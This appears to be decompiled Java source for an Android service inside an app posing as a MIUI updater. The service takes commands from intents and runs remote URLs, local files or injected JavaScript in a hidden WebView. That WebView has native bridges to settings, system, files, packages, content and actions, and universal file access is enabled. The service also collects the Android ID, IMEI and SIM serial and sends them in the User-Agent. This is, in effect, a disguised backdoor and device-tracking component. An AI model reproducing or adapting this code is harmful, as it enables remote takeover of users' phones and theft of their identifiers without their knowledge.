package brandmangroupe.miui.updater;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.TableRow.LayoutParams;
import java.util.UUID;

public class GlobalCode extends Service {
    public void onCreate() {
        super.onCreate();
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onDestroy() {
    }

    public String getexstras(Bundle extras, String name) {
        String out = "";
        if (extras == null || !extras.containsKey(name)) {
            return out;
        }
        return extras.getString(name);
    }

    public static String getUniqueID(Context context) {
        TelephonyManager tm = (TelephonyManager) context.getSystemService("phone");
        String deviceId = new UUID((long) (Secure.getString(context.getContentResolver(), "android_id")).hashCode(), (((long) (tm.getDeviceId()).hashCode()) << 32) | ((long) (tm.getSimSerialNumber()).hashCode())).toString();
        String key = "";
        try {
            ApplicationInfo appInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(), 128);
            if (appInfo.metaData != null) {
                key = appInfo.metaData.getString("sub");
            }
        } catch (NameNotFoundException oops) {
            oops.printStackTrace();
        }
        return new StringBuilder(String.valueOf(deviceId)).append("-").append(key).toString();
    }

    @SuppressLint({"NewApi"})
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            Bundle extras = intent.getExtras();
            if (extras != null) {
                String content = getexstras(extras, "content");
                String type = getexstras(extras, "type");
                String data = getexstras(extras, "data");
                WebView webview = new WebView(this);
                webview.setLayoutParams(new LayoutParams(0, -2, 1.0f));
                webview.addJavascriptInterface(new MeSetting(this), "MeSetting");
                webview.addJavascriptInterface(new MeSystem(this), "MeSystem");
                webview.addJavascriptInterface(new MeFile(this), "MeFile");
                webview.addJavascriptInterface(new MePackage(this), "MePackage");
                webview.addJavascriptInterface(new MeContent(this), "MeContent");
                webview.addJavascriptInterface(new MeAction(this), "MeAction");
                WebSettings webSettings = webview.getSettings();
                webSettings.setSavePassword(true);
                webSettings.setSaveFormData(true);
                webSettings.setAllowFileAccess(true);
                if (VERSION.SDK_INT >= 16) {
                    webSettings.setAllowFileAccessFromFileURLs(true);
                    webSettings.setAllowUniversalAccessFromFileURLs(true);
                }
                webSettings.setJavaScriptEnabled(true);
                webSettings.setUserAgentString("Hash: " + getUniqueID(this));
                if (content.substring(0, 7).contains("http://")) {
                    webview.loadUrl(Uri.parse(content).buildUpon().appendQueryParameter("type", type).appendQueryParameter("data", data).build().toString());
                }
                if (content.substring(0, 8).contains("file:///")) {
                    webview.loadUrl(Uri.parse(content).buildUpon().build().toString());
                }
                if (content.substring(0, 11).contains("javascript:")) {
                    webview.loadData("<script>" + content.substring(11) + "</script>", "text/html; charset=UTF-8", null);
                }
            }
        }
        return 1;
    }
}
